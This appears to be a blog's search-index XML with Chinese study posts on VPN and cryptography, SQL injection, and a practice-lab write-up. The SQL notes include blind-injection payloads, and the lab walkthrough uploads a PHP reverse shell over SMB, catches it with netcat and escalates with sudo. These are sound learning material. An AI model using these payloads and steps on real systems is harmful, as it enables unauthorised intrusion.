<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2024 | 博客前传</title>
      <link href="/2023/01/14/5w2h-godweiyang/"/>
      <url>/2023/01/14/5w2h-godweiyang/</url>
      
        <content type="html"><![CDATA[<p><img src="/medias/contact.jpg" alt></p><h2 id="When？什么时候开始写的？"><a href="#When？什么时候开始写的？" class="headerlink" title="When？什么时候开始写的？"></a>When？什么时候开始写的？</h2><p>第一次写博客是 2023 年了，在 CSDN 和博客园上面，当时写文章是为了记录主要还是因为 CSDN 和博客园的体验太差了，写起文章来很难受，又丑又慢。另一个原因是， CSDN 发个文章还需要审核，定制主题自由度也太差。</p><p>第二次就是 2024 年暑假了，当时自己建了个人博客，域名是：(<a href="https://jjfacq.github.io)。当时的想法是，个人博客好好看，有各种主题，如果会点前端知识，还能自己魔改。个人博客主要更新的就是自然语言处理的知识了，主要都是些论文的阅读赏析。另外还更新一些计算机相关的基础知识，主要考虑到绝大多数人并不会对枯燥又专业的自然语言处理感兴趣。最近也开始更新起来了，主要写一些网络内容。">https://jjfacq.github.io)。当时的想法是，个人博客好好看，有各种主题，如果会点前端知识，还能自己魔改。个人博客主要更新的就是自然语言处理的知识了，主要都是些论文的阅读赏析。另外还更新一些计算机相关的基础知识，主要考虑到绝大多数人并不会对枯燥又专业的自然语言处理感兴趣。最近也开始更新起来了，主要写一些网络内容。</a></p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024 | 网络安全</title>
      <link href="/2023/01/14/lwaq/"/>
      <url>/2023/01/14/lwaq/</url>
      
        <content type="html"><![CDATA[<p><img src="/medias/contact.jpg" alt></p><h1 id="网络安全技术"><a href="#网络安全技术" class="headerlink" title="网络安全技术"></a>网络安全技术</h1><h2 id="6-VPN-技术"><a href="#6-VPN-技术" class="headerlink" title="6.VPN 技术"></a>6.VPN 技术</h2><p>    VPN定义：虚拟专用网(Virtual Private Network)是一种“通过共享的公共网络建立私有的数据通道，将各个需要接入这张虚拟网的网络或终端通过通道连接起来，构成一个专用的、具有一定安全性和服务质量保证的网络 ”</p><p>用户不再需要拥有实际的专用长途数据线路，而是利用Internet的长途数据线路建立自己的私有网络 </p><p>VPN常见技术：5<br>VPN还需采取其他技术保证数据的安全性，主要包括加解密技术、密钥管理技术、 数据认证技术和身份认证技术、隧道技术等。</p><h2 id="-隧道技术"><a href="#-隧道技术" class="headerlink" title="    隧道技术"></a>    隧道技术</h2><p>隧道技术是VPN技术中最关键的技术。隧道技术是指在隧道的两端通过封装以及解封装技术在公网上建立一条数据通道，使用这条通道对数据报文进行传输。隧道是由隧道协议形成的，分为第二、三层隧道协议。二层隧道协议，使用二层网络协议进行传输，它主要应用于构建远程访问虚拟专网，第二层隧道协议主要有L2F、PPTP、L2TP等。L2TP协议是目前IETF的标准，由IETF融合PPTP与L2F而形成；三层隧道协议，用于传输三层网络协议，它主要应用于构建企业内部虚拟专网和扩展的企业内部虚拟专网，主要的第三层隧道协议有GRE、IPSec等。IPSec（IP Security）由多个协议组成，并通过这个协议集来提供安全协议选择、安全算法，确定服务所使用密钥等服务，从而在IP层提供安全保障。</p><h2 id="-数据认证技术和身份认证技术"><a href="#-数据认证技术和身份认证技术" class="headerlink" title="    数据认证技术和身份认证技术"></a>    数据认证技术和身份认证技术</h2><p>数据认证技术主要保证数据在网络传输过程中不被非法篡改。数据认证技术主要采用哈希算法，由于哈希算法的不可逆特性以及理论上的结果唯一性，因此在摘要相同的情况下可以保证数据没被篡改过。<br>身份认证技术主要保证接入VPN的操作人员的合法性以及有效性，主要采用“用户名密码”方式进行认证，对安全性较高的还可以使用USB KEY等认证方式。</p><h2 id="-加解密技术"><a href="#-加解密技术" class="headerlink" title="    加解密技术"></a>    加解密技术</h2><p>加解密技术是数据通信中一项较成熟的技术，VPN技术可以借助加解密技术保证数据在网络中传输时不被非法获取。即当数据被封装入隧道后立即进行加密，只有当数据到达隧道对端后，才能由隧道对端对数据进行解密。</p><p>隧道是由隧道协议形成的，分为第二、三层隧道协议。二层隧道协议，使用二层网络协议进行传输，它主要应用于构建远程访问虚拟专网，第二层隧道协议主要有L2F、PPTP、L2TP等。L2TP协议是目前IETF的标准，由IETF融合PPTP与L2F而形成；三层隧道协议，用于传输三层网络协议，它主要应用于构建企业内部虚拟专网和扩展的企业内部虚拟专网，主要的第三层隧道协议有GRE、IPSec等。</p><p>凯撒加密法，双轨加密法<br>加密技术有四个要素：明文（Plaintext）、密钥（Key）、加密算法（Encrypt）、密文（Ciphertext）。</p><p>加密算法的表达式为：C=En（K，P）</p><p>密码技术可以看作是一个复杂的函数变换， C代表密文，即加密后得到的字符序列；P代表明文即待加密的字符序列，K表示密钥，En表示加密算法，是秘密选定的一个字符序列。</p><p>什么是加密：明文按照某种算法转换为密文的过程<br>明文：<br>密文：<br>密码提供的服务有：1.机密性、2.完整性、3.可用性、4.抗抵赖性：<br>加密技术分类<br>根据密钥分类：</p><h2 id="-密钥：私钥、公钥"><a href="#-密钥：私钥、公钥" class="headerlink" title="    密钥：私钥、公钥"></a>    密钥：私钥、公钥</h2><h3 id="-对称加密：加密、解密用同一个密钥"><a href="#-对称加密：加密、解密用同一个密钥" class="headerlink" title="    对称加密：加密、解密用同一个密钥"></a>    对称加密：加密、解密用同一个密钥</h3><h3 id="-非对称加密：在加密和解密中使用两个不同的密钥，私钥用来保护数据，公钥则由同一系统的人公用，用来检验信息及其发送者的真实性和身份。"><a href="#-非对称加密：在加密和解密中使用两个不同的密钥，私钥用来保护数据，公钥则由同一系统的人公用，用来检验信息及其发送者的真实性和身份。" class="headerlink" title="    非对称加密：在加密和解密中使用两个不同的密钥，私钥用来保护数据，公钥则由同一系统的人公用，用来检验信息及其发送者的真实性和身份。"></a>    非对称加密：在加密和解密中使用两个不同的密钥，私钥用来保护数据，公钥则由同一系统的人公用，用来检验信息及其发送者的真实性和身份。</h3><h2 id="对称加密的安全使用有两个要求："><a href="#对称加密的安全使用有两个要求：" class="headerlink" title="对称加密的安全使用有两个要求："></a>对称加密的安全使用有两个要求：</h2><h3 id="-需要一个强（strong）加密算法：密钥要足够强壮，使得攻击者不能通过已有的明文和密文对应来破解。"><a href="#-需要一个强（strong）加密算法：密钥要足够强壮，使得攻击者不能通过已有的明文和密文对应来破解。" class="headerlink" title="    需要一个强（strong）加密算法：密钥要足够强壮，使得攻击者不能通过已有的明文和密文对应来破解。"></a>    需要一个强（strong）加密算法：密钥要足够强壮，使得攻击者不能通过已有的明文和密文对应来破解。</h3><h3 id="-密钥的传递需要一个安全的方式：要求发送者要把密钥通过安全的方式告诉接收者，不能让第三方知道。"><a href="#-密钥的传递需要一个安全的方式：要求发送者要把密钥通过安全的方式告诉接收者，不能让第三方知道。" class="headerlink" title="    密钥的传递需要一个安全的方式：要求发送者要把密钥通过安全的方式告诉接收者，不能让第三方知道。"></a>    密钥的传递需要一个安全的方式：要求发送者要把密钥通过安全的方式告诉接收者，不能让第三方知道。</h3><h2 id="常见的对称分组加密算法："><a href="#常见的对称分组加密算法：" class="headerlink" title="常见的对称分组加密算法："></a>常见的对称分组加密算法：</h2><h3 id="-DES：输入的明文为64位，密钥为56位，生成的密文为64位"><a href="#-DES：输入的明文为64位，密钥为56位，生成的密文为64位" class="headerlink" title="    DES：输入的明文为64位，密钥为56位，生成的密文为64位"></a>    DES：输入的明文为64位，密钥为56位，生成的密文为64位</h3><h2 id="-3DES："><a href="#-3DES：" class="headerlink" title="    3DES："></a>    3DES：</h2><h2 id="-AES：相比较而言，DES和3DES加密速度比较慢，AES采用128位的分组长度，支持长度为128位、192位和256位的密钥长度，并可支持不同的平台。128位的密钥长度能够提供足够的安全性，而且比更长的密钥需要较少的处理时间。到目前为止，AES还没有出现任何致命缺陷。AES取代DES和3DES以增强安全性和效率已是大势所趋。"><a href="#-AES：相比较而言，DES和3DES加密速度比较慢，AES采用128位的分组长度，支持长度为128位、192位和256位的密钥长度，并可支持不同的平台。128位的密钥长度能够提供足够的安全性，而且比更长的密钥需要较少的处理时间。到目前为止，AES还没有出现任何致命缺陷。AES取代DES和3DES以增强安全性和效率已是大势所趋。" class="headerlink" title="    AES：相比较而言，DES和3DES加密速度比较慢，AES采用128位的分组长度，支持长度为128位、192位和256位的密钥长度，并可支持不同的平台。128位的密钥长度能够提供足够的安全性，而且比更长的密钥需要较少的处理时间。到目前为止，AES还没有出现任何致命缺陷。AES取代DES和3DES以增强安全性和效率已是大势所趋。"></a>    AES：相比较而言，DES和3DES加密速度比较慢，AES采用128位的分组长度，支持长度为128位、192位和256位的密钥长度，并可支持不同的平台。128位的密钥长度能够提供足够的安全性，而且比更长的密钥需要较少的处理时间。到目前为止，AES还没有出现任何致命缺陷。AES取代DES和3DES以增强安全性和效率已是大势所趋。</h2><h3 id="-IDEA：输入明文为64位，密钥为128位，生成的密文为64位；PGP中已实现了IDEA"><a href="#-IDEA：输入明文为64位，密钥为128位，生成的密文为64位；PGP中已实现了IDEA" class="headerlink" title="    IDEA：输入明文为64位，密钥为128位，生成的密文为64位；PGP中已实现了IDEA"></a>    IDEA：输入明文为64位，密钥为128位，生成的密文为64位；PGP中已实现了IDEA</h3><h3 id="-RC2，RC5，RC6"><a href="#-RC2，RC5，RC6" class="headerlink" title="    RC2，RC5，RC6"></a>    RC2，RC5，RC6</h3><h2 id="对称密钥算法的优缺点："><a href="#对称密钥算法的优缺点：" class="headerlink" title="对称密钥算法的优缺点："></a>对称密钥算法的优缺点：</h2><p>对称密钥的主要优点在于速度快，通常比非对称密钥快100倍以上，而且可以方便地通过硬件实现。<br>其主要缺点在于密钥的管理复杂和缺乏抗抵赖性。由于每对通信者间都需要一个不同的密钥，N个人通信需要n（n-1）/2密钥；同时如何安全的传递秘密密钥给信息接收方成为最大的问题；并且由于没有签名机制，因此也不能实现抗抵赖问题，即通信双方都可以否认发送或接收过的信息。</p><h2 id="对称与非对称算法对比"><a href="#对称与非对称算法对比" class="headerlink" title="对称与非对称算法对比"></a>对称与非对称算法对比</h2><p>    对称密钥算法：常用于数据量大的数据的加密<br>    优点：加解密速度快<br>    缺点：密钥分发问题<br>    非对称密钥算法：常用于数据量小的加密（数字签名，小量数据传输加密）<br>    优点：密钥安全性高<br>    缺点：加解密对速度敏感<br>对称和非对称密钥算法通常结合使用，用于密钥加密和数字签名，即实现安全又能优化性能。</p><p>散列：保证数据的完整性（MD5,SHA）<br>数字签名：私钥加密，公钥解密<br>密钥交换的过程<br>如发小量数据给A，则用A的公钥加密，A收到后用其私钥解密。<br>密钥管理技术：密钥产生，分配保存，更换与销毁</p><h2 id="VPN分类："><a href="#VPN分类：" class="headerlink" title="VPN分类："></a>VPN分类：</h2><p>    按业务用途划分：Access VPN—远程接入VPN，Intranet VPN，Extranet VPN<br>    按实现层次分：第2层VPN (PPTP,L2F,L2TP)；第3层VPN(GRE,IPSEC),应用层的VPN（SSL VPN）</p><h2 id="L2TP-VPN技术-1701"><a href="#L2TP-VPN技术-1701" class="headerlink" title="L2TP  VPN技术   1701"></a>L2TP  VPN技术   1701</h2><p>    L2TP (Layer Two Tunneling Protocol) 二层隧道协议<br>    为在用户和企业的服务器之间透明传输PPP报文而设置的隧道协议。提供了对PPP 链路层数据包的通道（Tunnel）传输支持。<br>    结合了L2F 协议和PPTP 协议的各自优点，成为IETF 有关二层隧道协议的工业标准。<br>    主要用途<br>    企业驻外机构和出差人员可从远程经由公共网络，通过虚拟隧道实现和企业总部之间的网络连接<br>二层隧道协议特征：身份验证，多协议传输，支持RADIUS，内部地址分配，<br>计费灵活，可靠<br>L2TP数据消息：为PPP报文。同一隧道内可有多个会话，即多个业务<br>LNS发往LAC的报文封装和解封装过程和上面类似，主要区别是LAC解封装过程中将公网IP头、UDP头和L2TP头解封装以后，不再解封装PPP头，而是直接将PPP报文通过PPP Session发往Client。<br>L2TP消息：控制消息，数据消息<br>控制消息：用于隧道和回话的建立、维护及传输控制<br>数据消息：用于封装PPP帧并在隧道上传输<br>L2TP方式：Client-Initialized方式L2TP，NAS-Initialized方式L2TP</p><h2 id="GRE-VPN-实训题"><a href="#GRE-VPN-实训题" class="headerlink" title="GRE VPN   实训题"></a>GRE VPN   实训题</h2><p>    GRE 提供了将一种协议的报文封装在另一种协议报文中的机制，使报文能够在异种网络中传输，异种报文传输的通道称为tunnel(判断)<br>相关的概念解释如下：<br>    载荷（Payload）：系统收到的需要封装和路由的数据报称为载荷。<br>    乘客协议（Passenger Protocol）：封装前的报文协议称为乘客协议。<br>    封装协议（Encapsulation Protocol）：上述的GRE协议称为封装协议，也称为运载协议（Carrier Protocol）<br>    传输协议（Transport Protocol或者Delivery Protocol）：负责对封装后的报文进行转发的协议称为传输协议。</p><h2 id="GRE特点："><a href="#GRE特点：" class="headerlink" title="GRE特点："></a>GRE特点：</h2><p>    机制简单，对隧道两端设备的CPU负担小。<br>    本身不提供数据的加密。<br>    不对数据源进行验证<br>    不保证报文正确到达目的地<br>    不提供流量控制和QoS特性<br>    多协议的本地网可以通过单一协议的骨干网实现传输<br>    将一些不能连续的子网连接起来，用于组建VPN<br>GRE的实现–隧道接口包含以下元素：（程序）<br>    源地址：报文传输协议中的源地址。从负责封装后报文传输的网络来看，隧道的源地址就是实际发送报文的接口IP地址。<br>    目的地址：报文传输协议中的目的地址。从负责封装后报文传输的网络来看，隧道本端的目的地址就是隧道目的端的源地址。<br>    隧道接口IP地址：为了在隧道接口上启用动态路由协议，或使用静态路由协议发布隧道接口，要为隧道接口分配IP地址。隧道接口的IP地址可以不是公网地址，甚至可以借用其他接口的IP地址以节约IP地址。但是当Tunnel接口借用IP地址时，由于Tunnel接口本身没有IP地址，无法在此接口上启用动态路由协议，必须配置静态路由或策略路由才能实现路由器间的连通性。<br>    封装类型：隧道接口的封装类型是指该隧道接口对报文进行的封装方式。一般情况下有四种封装方式，分别是GRE、MPLS TE、IPv6-IPv4 和IPv4-IPv6。<br>经过手工配置，成功建立隧道之后，就可以将隧道接口看成是一个物理接口，可以在其上运行动态路由协议或配置静态路由。<br>GRE报文的目的协议字段值为47    </p><h2 id="IPSec-VPN"><a href="#IPSec-VPN" class="headerlink" title="IPSec  VPN"></a>IPSec  VPN</h2><p>IPSec特性：机密性，完整性，真实性，防重放<br>IPSec端到端应用场景：安全网关之间，主机与安全网关之间，主机与主机之间<br>IPSec VPN体系结构：AH协议，ESP协议，IKE协议<br>    AH协议51：AH是报文头验证协议，主要提供的功能有数据源验证、数据完整性校验和防报文重放功能。然而，AH并不加密所保护的数据报。<br>    ESP协议50：ESP是封装安全载荷协议。它除提供AH协议的所有功能外（但其数据完整性校验不包括IP头），还可提供对IP报文的加密功能。<br>    IKE协议：IKE协议用于自动协商AH和ESP所使用的密码算法<br>OR<br>    AH（Authentication Header）报文头验证协议，主要提供的功能有数据源验证、数据完整性校验和防报文重放功能；然而，AH并不加密所保护的数据报文。<br>    ESP（Encapsulating Security Payload）ESP是封装安全载荷协议。它除提供AH协议的所有功能外（但其数据完整性校验不包括IP头），还可提供对IP报文的加密功能。</p><h2 id="IPSec协议封装模式：传输模式，隧道模式"><a href="#IPSec协议封装模式：传输模式，隧道模式" class="headerlink" title="IPSec协议封装模式：传输模式，隧道模式"></a>IPSec协议封装模式：传输模式，隧道模式</h2><p>    传输模式（Transport  Mode）：<br>1）应用场景1：主机与网络安全网关之间的通信；<br>2）应用场景2：主机与主机之间的通信。<br>    隧道模式（Tunnel  Mode）：<br>1）应用场景：网络安全网关之间的通信。</p><h3 id="在传输模式下，IPSec头被插入到IP头之后但在所有传输层协议之前，或所有其他IPSec协议之前。"><a href="#在传输模式下，IPSec头被插入到IP头之后但在所有传输层协议之前，或所有其他IPSec协议之前。" class="headerlink" title="在传输模式下，IPSec头被插入到IP头之后但在所有传输层协议之前，或所有其他IPSec协议之前。"></a>在传输模式下，IPSec头被插入到IP头之后但在所有传输层协议之前，或所有其他IPSec协议之前。</h3><p>    在隧道模式下， IPSec头插在原始IP头之前，另外生成一个新的报文头放到AH或ESP之前。<br>    封装模式对比：<br>    安全性：<br>    隧道模式隐藏原IP头信息，安全性更好。<br>    性能：<br>    隧道模式有一个额外的IP头，隧道模式比传输模式占用更多带宽。<br>    具体选择那封装模式，需要在性能和安全之间做权衡 。</p><h2 id="IPSec-VPN加密和验证算法"><a href="#IPSec-VPN加密和验证算法" class="headerlink" title="IPSec VPN加密和验证算法"></a>IPSec VPN加密和验证算法</h2><p>    加密算法<br>    DES ( 56bità64bit )<br>    3DES( 3个 56bit à64bit )<br>    AES (128、192、256)<br>     国密(256)<br>    验证算法<br>     MD5( 128bit )<br>     SHA-1( 160bit )<br>    AH在IP报文头中的协议号为51<br>    传输模式: 验证整个IP报文<br>    隧道模式: 验证新IP头及整个IP报文<br>    ESP在IP报头中的协议号为50<br>    传输模式: ESP报头位于IP报头和传输层协议报头之间，在数据后面增加ESP尾<br>    隧道模式: ESP报头位于新IP头和初始报文之间，在数据后面增加ESP尾。</p><h3 id="IKE的安全机制：DH算法、密钥分发；前向安全性；身份验证；身份保护（及解释，作用）"><a href="#IKE的安全机制：DH算法、密钥分发；前向安全性；身份验证；身份保护（及解释，作用）" class="headerlink" title="IKE的安全机制：DH算法、密钥分发；前向安全性；身份验证；身份保护（及解释，作用）"></a>IKE的安全机制：DH算法、密钥分发；前向安全性；身份验证；身份保护（及解释，作用）</h3><p>SA（安全联盟）由三元组来唯一标识 ，包括安全参数索引 、目的IP地址、安全协议号 </p><h2 id="IKE使用了两个阶段为IPSec进行密钥协商并建立安全联盟："><a href="#IKE使用了两个阶段为IPSec进行密钥协商并建立安全联盟：" class="headerlink" title="IKE使用了两个阶段为IPSec进行密钥协商并建立安全联盟："></a>IKE使用了两个阶段为IPSec进行密钥协商并建立安全联盟：</h2><p>    第一阶段，通信各方彼此间建立了一个已通过身份验证和安全保护的隧道，即IKE SA。协商模式包括主模式、野蛮模式。认证方式包括预共享密钥、数字签名方式、公钥加密。<br>    第二阶段，用在第一阶段建立的安全隧道为IPSec协商安全服务，建立IPSec SA。IPSec SA用于最终的IP数据安全传送。协商模式为快速模式。<br>IKE 第一阶段的协商可以采用两种模式：主模式（Main Mode，6次握手）和野蛮模式（Aggressive Mode，3次握手）。第二阶段协商模式――快速模式</p><h2 id="IKE主模式和野蛮模式区别"><a href="#IKE主模式和野蛮模式区别" class="headerlink" title="IKE主模式和野蛮模式区别"></a>IKE主模式和野蛮模式区别</h2><p>    交换的消息:<br>    主模式为6个，野蛮模式为3个。<br>    身份保护：<br>    主模式的最后两条消息有加密，可以提供身份保护功能；而野蛮模式消息集成度过高，因此无身份保护功能<br>    对等体标识:<br>    主模式只能采用IP地址方式标识对等体；而野蛮模式可以采用IP地址方式或者Name方式标识对等体。</p><h2 id="IPSec流量处理"><a href="#IPSec流量处理" class="headerlink" title="IPSec流量处理"></a>IPSec流量处理</h2><p>    出站与入站<br>    丢弃报文<br>    绕过安全服务（访问外网INTERNET）<br>    应用安全服务(进入IPSec VPN）</p><h2 id="SSL-VPN"><a href="#SSL-VPN" class="headerlink" title="SSL VPN"></a>SSL VPN</h2><p>SSL协议的位置？<br>SSL协议从以下方面确保了数据通信的安全（含解释）<br>    身份认证<br>    在建立SSL连接之前，客户端和服务器之间需要进行身份认证，认证采用数字证书，可以是客户端对服务器的认证，也可以是双方进行双向认证。<br>    机密性<br>    采用加密算法对需要传输的数据进行加密。<br>    完整性<br>    采用数据鉴别算法，验证所接收的数据在传输过程中是否被修改。<br>SSL协议过程通过3个元素来完成<br>    握手协议<br>    记录协议<br>    警告协议<br>SSL采用会话恢复的方式来减少SSL握手过程中造成的巨大开销。（什么时候使用）<br>SSL VPN功能技术：领先的虚拟网关；Web代理；文件共享；端口代理；网络扩展；用户安全控制；完善的日志功能<br>Web代理有两种实现方式： Web-link（active x）和Web改写(改链接回）<br>文件共享：支持SMB协议；NFS协议</p><h2 id="文件共享实现过程："><a href="#文件共享实现过程：" class="headerlink" title="文件共享实现过程："></a>文件共享实现过程：</h2><p>    以访问内网Windows文件服务器为例：<br>    客户端向内网文件服务器发起HTTPS格式的请求，发送到SVN；<br>    SVN将HTTPS格式的请求报文转换为SMB格式的报文；<br>    SVN发送SMB格式的请求报文给文件服务器。<br>    文件服务器接受请求报文，将请求结果发送给SVN，用的是SMB报文；<br>    SVN将SMB应答报文转换为HTTPS格式；<br>    将请求结果（HTTPS格式）发送到客户端；</p><h2 id="文件共享应用特点：所有文件接入需要认证，所有文件传输采用SSH加密，文件级的访问权限控件，SVN增加额外的访问控制"><a href="#文件共享应用特点：所有文件接入需要认证，所有文件传输采用SSH加密，文件级的访问权限控件，SVN增加额外的访问控制" class="headerlink" title="文件共享应用特点：所有文件接入需要认证，所有文件传输采用SSH加密，文件级的访问权限控件，SVN增加额外的访问控制"></a>文件共享应用特点：所有文件接入需要认证，所有文件传输采用SSH加密，文件级的访问权限控件，SVN增加额外的访问控制</h2><p>端口转发提供丰富的内网TCP应用服务<br>    广泛支持静态端口的TCP应用<br>    单端口单服务器（如：Telnet，SSH，MS RDP，VNC等）<br>    单端口多服务器（如： Lotus Notes）<br>    多端口多服务器（如： Outlook ）<br>    支持动态端口的TCP应用<br>    动态端口（如： FTP，Oracle）<br>    提供端口级的访问控制</p><h2 id="网络扩展："><a href="#网络扩展：" class="headerlink" title="网络扩展："></a>网络扩展：</h2><p>    实现方式：<br>    ActiveX控件；<br>    专用客户端软件：一次安装，零配置；<br>    访问方式（其区别）<br>    全通道（Full Tunnel）－－ 只允许访问企业内网；<br>    分离通道（Split Tunnel ）－－ 可同时访问企业内网和本地子网；<br>    手动（Manual Tunnel ）－－  可访问内网特定网段的资源</p><h2 id="VPN的密钥及图（非对称加密专，密钥交换等"><a href="#VPN的密钥及图（非对称加密专，密钥交换等" class="headerlink" title="VPN的密钥及图（非对称加密专，密钥交换等"></a>VPN的密钥及图（非对称加密专，密钥交换等</h2><p>程序30分：基本配置（IP配置，接口加入区域），域间包过滤（放行的策略）。GRE  VPN，点到点的IPSEC VPN，NAT SERVER &amp;NAT INBOUND</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入 | 渗透测试</title>
      <link href="/2023/01/14/sqlzhuru/"/>
      <url>/2023/01/14/sqlzhuru/</url>
      
        <content type="html"><![CDATA[<p> <img src="/medias/%5Cfeatureimages%5C26.jpg" alt></p><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>Web漏洞两大关键因素：</p><ol><li><p>参数可控<br>向应用传递的参数用户可以控制</p></li><li><p>后台执行<br>用户向应用传递了参数后，后台将参数执行</p></li></ol><h2 id="注入步骤"><a href="#注入步骤" class="headerlink" title="注入步骤"></a>注入步骤</h2><ol><li><p>单引号，判断注入点数据类型，int、string</p></li><li><p>and或者or进行逻辑判断，是否可以执行逻辑</p></li><li><p>order by 判断有多少列</p></li><li><p>通过union select 1,2,3判断显示位，是原本的输出不影响判断</p></li><li><p>查库、表、列三级结构<br>information_schema</p><ul><li>schemata用于查询库名 schema_name</li><li>tables用于查询表名 table_name</li><li>columns用于查询列名 column_name</li></ul></li><li><p>查询列内容<br>select 列名 from 库名.表名 where 限定条件</p></li></ol><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ul><li>MySQL版本5.0以下，不支持报错注入，也没有information_schema库</li><li>extractvalue() updatexml()有32位长度限制</li></ul><h2 id="为什么使用报错注入"><a href="#为什么使用报错注入" class="headerlink" title="为什么使用报错注入"></a>为什么使用报错注入</h2><ol><li>union被过滤</li><li>无论正确与否，都不显示结果</li><li>当语句错误，有错误提示 mysql_error()</li></ol><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>使用length()/substr()/ascii()查询数据库名需要几步</p><ol><li>select length(database())&gt;10;//长度为8</li><li>select ascii(substr(database(),$num,1))=10;//不断的取ascii码,$num从1~8</li><li>查询</li></ol><p><a href="http://127.0.0.1/sqli-labs/Less-8/?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-8/?id=1&#39;</a> and ascii(substr(database(),1,1)) =115–+</p><p><a href="http://127.0.0.1/sqli-labs/Less-8/?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-8/?id=1&#39;</a> and ascii(substr(database(),n,1)) =ascii–+<br>变量1是n，变量2是ascii<br>n的取值范围，ascii的取值范围<br>n：1<del>8<br>ascii：97</del>122</p><h2 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h2><p>不依赖回显，依赖于延迟</p><p>if(条件,sleep(1),sleep(2))</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>什么时候用报错注入，有mysql_error()，有报错的时候可以使用</li><li>什么时候用布尔注入，可以进行条件判断，and/or，true/false</li><li>什么时候用时间盲注，当没回显，不知道正确与否，但是执行sleep后浏览器会有延迟<br>核心：还是查询语句<br>区别：利用函数的不同，显示方式的不同</li></ol><h2 id="实践案例"><a href="#实践案例" class="headerlink" title="实践案例"></a>实践案例</h2><ol><li><p>DVWA网站的bind sql injection<br>低中高三个级别<br>根据已有（where）的库表结构，查列</p></li><li><p>sqli-labs的less8和less9<br>根据已有（where）的库表结构，查列</p></li><li><p>源码分析<br>截取关键语句，截图配说明</p></li></ol><h2 id="预习"><a href="#预习" class="headerlink" title="预习"></a>预习</h2><p>sqlmap使用，从github下载</p>]]></content>
      
      
      <categories>
          
          <category> 渗透学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VulNyx-Exec | 靶机</title>
      <link href="/2023/01/14/wp-2/"/>
      <url>/2023/01/14/wp-2/</url>
      
        <content type="html"><![CDATA[<p><img src="/medias/%5Cfeatureimages%5C15.jpg" alt></p><h1 id="arp-scan-l扫出目标ip"><a href="#arp-scan-l扫出目标ip" class="headerlink" title="arp-scan -l扫出目标ip"></a>arp-scan -l扫出目标ip</h1><p>192.168.193.130</p><h1 id="用nmap对ip进行快速扫描端口"><a href="#用nmap对ip进行快速扫描端口" class="headerlink" title="用nmap对ip进行快速扫描端口"></a>用nmap对ip进行快速扫描端口</h1><p>-sS使用tcp syn 扫描 -sV进行版本探测 -T5是快速扫描级别最高级  -A是全面扫描 -p-是端口扫描</p><blockquote><p>nmap -sS -sV -T5 -A -p- 192.168.193.130</p></blockquote><p>扫描出22 80 139 445端口 ，有80端口，我们可以去浏览器看看有没有http网页，发现有html网页</p><p>我们可以用smbclient来查看有什么共享的资源用</p><blockquote><p>smbclient -L //192.168.193.130</p></blockquote><p>看到有个server<br>让后可以用smbclient 与服务器进行交互连接</p><blockquote><p>smbclient //192.168.193.130/server</p></blockquote><h2 id="然后连接到smb服务器"><a href="#然后连接到smb服务器" class="headerlink" title="然后连接到smb服务器"></a>然后连接到smb服务器</h2><h2 id="然后我们看到这个服务器是可以上传文件的，这边我们随便在本地创建一个a-php空文件，让后用kali自动生成进去一个"><a href="#然后我们看到这个服务器是可以上传文件的，这边我们随便在本地创建一个a-php空文件，让后用kali自动生成进去一个" class="headerlink" title="然后我们看到这个服务器是可以上传文件的，这边我们随便在本地创建一个a.php空文件，让后用kali自动生成进去一个"></a>然后我们看到这个服务器是可以上传文件的，这边我们随便在本地创建一个a.php空文件，让后用kali自动生成进去一个</h2><p>反弹webshell的a.php文件木马，</p><blockquote><p>/usr/share/webshells/php/php-reverse-shell a.php</p></blockquote><p>让后用连接的smb把木马文件上传</p><blockquote><p>put a.php</p></blockquote><h2 id="上传木马后，我们用nc-lp-1234-对目标进行监听"><a href="#上传木马后，我们用nc-lp-1234-对目标进行监听" class="headerlink" title="上传木马后，我们用nc -lp 1234 对目标进行监听"></a>上传木马后，我们用nc -lp 1234 对目标进行监听</h2><p>然后我们去浏览器，访问一下我们上传的木马<br>把shell反弹过来</p><blockquote><p>192.168.193.130/a.php<br>让后监听成功，可以用/usr/bin/script -qc /bin/bash /dev/null这个命令进入shell模式<br>/usr/bin/script -qc /bin/bash /dev/null</p></blockquote><p>然后我们使用</p><blockquote><p>sudo -l<br>看下换个身份执行命令看到（s3cur4）这个用户<br>然后我们用这个用户执行命令<br>sudo -us3cur4 bash</p></blockquote><h2 id="然后我们cd到家目录"><a href="#然后我们cd到家目录" class="headerlink" title="然后我们cd到家目录"></a>然后我们cd到家目录</h2><blockquote><p>cd<br>ls<br>cat user.txt<br>看一下文件内容夺取成功</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 靶机打靶 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
